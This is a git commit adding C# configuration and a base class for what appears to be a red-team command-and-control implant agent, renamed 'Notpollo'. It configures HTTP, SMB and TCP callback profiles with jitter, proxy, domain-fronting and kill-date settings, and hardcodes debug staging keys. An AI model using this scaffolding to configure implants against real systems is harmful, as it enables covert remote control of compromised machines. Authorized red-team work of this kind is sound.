051052c4288c4ecd11026a6a78716006716d5caa
klockw3rk <samuel.h.whang@gmail.com>
2022-06-24 13:26:46 -0400

    string substitution

---
+++ Payload_Type/apollo/agent_code/Apollo/Config.cs
@@ -0,0 +1,130 @@
+﻿#define C2PROFILE_NAME_UPPER
+
+#if DEBUG
+#define HTTP
+#endif
+
+#if HTTP
+using HttpTransport;
+#endif
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using NotpolloInterop.Structs.NotpolloStructs;
+using PSKCryptography;
+using NotpolloInterop.Serializers;
+#if SMB
+using NamedPipeTransport;
+#endif
+#if TCP
+using TcpTransport;
+#endif
+namespace Notpollo
+{
+    public static class Config
+    {
+        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
+        {
+#if HTTP
+            { "http", new C2ProfileData()
+                {
+                    TC2Profile = typeof(HttpProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "callback_interval", "5" },
+                        { "callback_jitter", "0" },
+                        { "callback_port", "80" },
+                        { "callback_host", "http://mythic" },
+                        { "post_uri", "data" },
+                        { "encrypted_exchange_check", "T" },
+                        { "proxy_host", "" },
+                        { "proxy_port", "" },
+                        { "proxy_user", "" },
+                        { "proxy_pass", "" },
+                        { "domain_front", "domain_front" },
+                        { "killdate", "-1" },
+                        { "USER_AGENT", "Notpollo-Refactor" },
+#else
+                        { "callback_interval", "callback_interval_here" },
+                        { "callback_jitter", "callback_jitter_here" },
+                        { "callback_port", "callback_port_here" },
+                        { "callback_host", "callback_host_here" },
+                        { "post_uri", "post_uri_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+                        { "proxy_host", "proxy_host_here" },
+                        { "proxy_port", "proxy_port_here" },
+                        { "proxy_user", "proxy_user_here" },
+                        { "proxy_pass", "proxy_pass_here" },
+                        { "killdate", "killdate_here" },
+                        HTTP_ADDITIONAL_HEADERS_HERE
+#endif
+                    }
+                }
+            },
+#endif
+#if SMB
+            { "smb", new C2ProfileData()
+                {
+                    TC2Profile = typeof(NamedPipeProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
+                        { "encrypted_exchange_check", "T" },
+#else
+                        { "pipename", "pipename_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+#endif
+                    }
+                }
+            },
+#elif TCP
+            { "tcp", new C2ProfileData()
+                {
+                    TC2Profile = typeof(TcpProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "port", "40000" },
+                        { "encrypted_exchange_check", "T" },
+#else
+                        { "port", "port_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+#endif
+                    }
+                }
+            }
+#endif
+                    };
+
+
+        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
+#if DEBUG
+#if HTTP
+        public static string StagingRSAPrivateKey = "ejezYqXCDzFUWbgyJ7BMVqCKfi02jOGUx4ZtAc1rllM=";
+#elif SMB
+        public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
+#elif TCP
+        public static string StagingRSAPrivateKey = "LbFpMoimB+aLx1pq0IqXJ1MQ4KIiGdp0LWju5jUhZRg=";
+#endif
+#if HTTP
+        public static string PayloadUUID = "084ece5f-7130-4a5a-81af-55e332802751";
+#elif SMB
+        public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
+#elif TCP
+        public static string PayloadUUID = "a51253f6-7885-4fea-9109-154ecc54060d";
+#endif
+#else
+        public static string StagingRSAPrivateKey = "AESPSK_here";
+        public static string PayloadUUID = "payload_uuid_here";
+#endif
+    }
+}
---
+++ Payload_Type/apollo/agent_code/ApolloInterop/Classes/Core/C2Profile.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs;
+using System.IO;
+using System.Runtime.Serialization.Json;
+using System.Collections.Concurrent;
+using NotpolloInterop.Structs.NotpolloStructs;
+using NotpolloInterop.Types.Delegates;
+using NotpolloInterop.Classes.Core;
+
+namespace NotpolloInterop.Classes
+{
+    public abstract class C2Profile
+    {
+        protected const int MAX_RETRIES = 10;
+        protected ISerializer Serializer;
+        protected IAgent Agent;
+        protected bool Connected = false;
+        protected ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
+        public C2Profile(Dictionary<string, string> parameters, ISerializer serializer, IAgent agent)
+        {
+            Agent = agent;
+            Serializer = serializer;
+        }
+    }
+}
